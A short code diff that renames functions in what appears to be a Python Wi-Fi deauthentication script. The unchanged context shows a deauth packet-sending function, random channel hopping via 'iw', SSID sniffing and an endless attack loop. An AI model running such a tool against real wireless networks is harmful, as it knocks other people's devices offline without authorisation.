@@ -29,15 +29,15 @@ def deauth(pkt):
           count=4, iface=iface, verbose=0)
 
 
-def chg_cnl():
+def change_channel():
     while True:
         cnl = randrange(1, 13)
         system("iw dev %s set channel %d" % (iface, cnl))
         sleep(0.3)
 
 
-def main_fnc():
-    p = Process(target=chg_cnl)
+def main_function():
+    p = Process(target=change_channel)
     p.start()
     pkt_ssid = wifi_snif()
     p.terminate()
@@ -46,4 +46,4 @@ def main_fnc():
 
 
 while 1:
-    main_fnc()
+    main_function()
